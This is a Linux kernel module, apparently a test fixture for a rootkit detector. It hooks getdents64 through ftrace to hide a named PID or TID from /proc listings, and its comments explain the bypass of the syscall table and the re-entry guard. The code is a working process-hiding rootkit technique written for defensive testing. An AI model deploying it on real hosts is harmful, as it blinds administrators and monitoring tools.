// Módulo de PROVA para os cenários RK-hidden-pid e RK-thread-count. NÃO é
// malicioso — é a técnica clássica de ocultação, no menor tamanho que arma
// exatamente a divergência que a Aletheia existe para pegar.
//
// A pergunta que ele responde: um processo (ou thread) que some da LISTAGEM de
// /proc — porque o getdents64 foi adulterado — continua STATÁVEL pelo caminho
// direto? Sim: readdir e lookup são caminhos de código diferentes no kernel.
// readdir enumera; open/stat de /proc/<pid> resolve o nome por proc_pid_lookup,
// que o hook do getdents não toca. Essa é a assimetria:
//
//   cross.hidden_pid    um filho VISÍVEL declara PPID=X; X responde a stat mas
//                       não aparece na listagem -> a listagem mentiu (CRITICAL)
//   cross.thread_count  o status diz N threads; o diretório task mostra N-1,
//                       porque uma entrada de TID foi filtrada do readdir
//
// COMO, e por que ftrace e não a TABELA DE SYSCALL: sobrescrever
// sys_call_table[__NR_getdents64] é NO-OP neste kernel (Alpine LTS 6.6). O
// despacho de syscall foi embutido em do_syscall_64 como um `switch` (some o
// símbolo x86_64_sys_call, e a tabela existe mas não é lida no despacho). Medido:
// a troca da entrada "pegava" na releitura e mesmo assim o PID continuava
// visível. ftrace PATCHEIA a própria função, então pega o despacho por switch.
//
// A re-entrada (nosso hook chama a original, que re-dispara o ftrace) é resolvida
// pela guarda within_module: quando o fentry vem de DENTRO deste módulo, é a
// nossa própria chamada à original — não redireciona. É a mesma estrutura do
// socknd, para uma função que DORME (getdents64 lê /proc): sem preempt_disable,
// porque a original pode dormir.
//
// Filtra por NOME: `oculto` é a string do PID (para /proc) ou do TID (para
// /proc/<pid>/task). Some de qualquer readdir onde o nome apareça.
//
// SEGURANÇA: só deve ser CARREGADO dentro da VM descartável. Esconder processo
// no host o cegaria até o rmmod. O module_exit restaura o hook.
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/ptrace.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("prova de que readdir adulterado diverge do stat direto - aletheia");

static char *oculto = "";
module_param(oculto, charp, 0);
MODULE_PARM_DESC(oculto, "d_name a filtrar do readdir (o PID ou TID a esconder)");

// --- kallsyms_lookup_name via kprobe: não exportado desde o 5.7. Igual socknd. ---
static unsigned long (*kln)(const char *);

static int resolver_kln(void)
{
	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
	if (register_kprobe(&kp) < 0)
		return -1;
	kln = (void *)kp.addr;
	unregister_kprobe(&kp);
	return kln ? 0 : -1;
}

// A original, e o hook que a chama e depois filtra o buffer.
static asmlinkage long (*real_gd)(const struct pt_regs *);
static struct ftrace_ops ops_gd;

// chamar_original chama a getdents64 real com um `call *` CRU, sem o thunk de
// retpoline.
//
// É o que faz a guarda within_module funcionar. Se a chamada passasse pelo
// __x86_indirect_thunk (o que o compilador emite para ponteiro de função em
// kernel com retpoline), o parent_ip do fentry cairia DENTRO do thunk — no core
// do kernel, não neste módulo —, within_module diria "não é meu", redirecionaria
// de novo para o hook e entraria em recursão infinita (é o motivo pelo qual o
// socknd rejeitou within_module). Com o `call *` literal, o endereço de retorno
// empilhado está em chamar_original, aqui no módulo, e a guarda reconhece a
// própria chamada. O destino tem endbr (é alvo de indirect call), então IBT
// aceita.
static long notrace chamar_original(const struct pt_regs *regs)
{
	long ret;
	asm volatile(
		"movq %1, %%rdi\n\t"
		"call *%2\n\t"
		"movq %%rax, %0\n\t"
		: "=r"(ret)
		: "r"(regs), "r"(real_gd)
		: "rax", "rdi", "rsi", "rdx", "rcx", "r8", "r9", "r10", "r11",
		  "memory", "cc");
	return ret;
}

// hooked_gd roda a original e REMOVE do buffer do usuário o registro cujo nome
// casa. getdents64 devolve struct linux_dirent64 de tamanho variável (d_reclen);
// esconder é copiar para o kernel, andar por reclen, memmover por cima do alvo e
// encurtar o retorno. open/stat de /proc/<pid> não passa por aqui.
static asmlinkage long hooked_gd(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *ud = (struct linux_dirent64 __user *)regs->si;
	long ret = chamar_original(regs); // re-dispara o ftrace; within_module deixa passar
	struct linux_dirent64 *kbuf, *d;
	long off = 0;

	if (ret <= 0 || !oculto || !oculto[0])
		return ret;
	kbuf = kvmalloc(ret, GFP_KERNEL);
	if (!kbuf)
		return ret; // sem esconder é melhor que corromper
	if (copy_from_user(kbuf, ud, ret)) {
		kvfree(kbuf);
		return ret;
	}
	while (off < ret) {
		d = (void *)kbuf + off;
		if (d->d_reclen == 0) // buffer inconsistente: não arrisca laço infinito
			break;
		if (strcmp(d->d_name, oculto) == 0) {
			long resto = ret - off - d->d_reclen;
			memmove(d, (char *)d + d->d_reclen, resto);
			ret -= d->d_reclen;
			continue;
		}
		off += d->d_reclen;
	}
	if (copy_to_user(ud, kbuf, ret)) {
		// retorno já encurtado; nada a fazer senão devolver o que deu
	}
	kvfree(kbuf);
	return ret;
}

// A guarda de re-entrada é within_module, e não a flag por-CPU do socknd: aquela
// depende de preempt_disable, que não vale para função que DORME. Quando o
// parent_ip está DENTRO deste módulo, o fentry veio da nossa chamada a real_gd —
// deixa correr a original. Do kernel, redireciona para o hook.
static void notrace thunk_gd(unsigned long ip, unsigned long parent_ip,
			     struct ftrace_ops *o, struct ftrace_regs *fregs)
{
	struct pt_regs *regs;
	if (within_module(parent_ip, THIS_MODULE))
		return;
	regs = ftrace_get_regs(fregs);
	regs->ip = (unsigned long)hooked_gd;
}

static int __init ph_init(void)
{
	unsigned long alvo;

	if (resolver_kln() != 0) {
		pr_err("pid-hide: kallsyms_lookup_name não resolvido\n");
		return -EINVAL;
	}
	alvo = kln("__x64_sys_getdents64");
	if (!alvo) {
		pr_err("pid-hide: __x64_sys_getdents64 não resolvido\n");
		return -EINVAL;
	}
	real_gd = (void *)alvo;
	ops_gd.func = thunk_gd;
	ops_gd.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
	if (ftrace_set_filter_ip(&ops_gd, alvo, 0, 0)) {
		pr_err("pid-hide: ftrace_set_filter_ip falhou\n");
		return -EINVAL;
	}
	if (register_ftrace_function(&ops_gd)) {
		pr_err("pid-hide: register_ftrace_function falhou\n");
		ftrace_set_filter_ip(&ops_gd, alvo, 1, 0);
		return -EINVAL;
	}
	pr_info("pid-hide: getdents64 hookado por ftrace, escondendo d_name=\"%s\"\n", oculto);
	return 0;
}

static void __exit ph_exit(void)
{
	unregister_ftrace_function(&ops_gd);
	ftrace_set_filter_ip(&ops_gd, (unsigned long)real_gd, 1, 0);
	pr_info("pid-hide: hook de getdents64 removido\n");
}

module_init(ph_init);
module_exit(ph_exit);
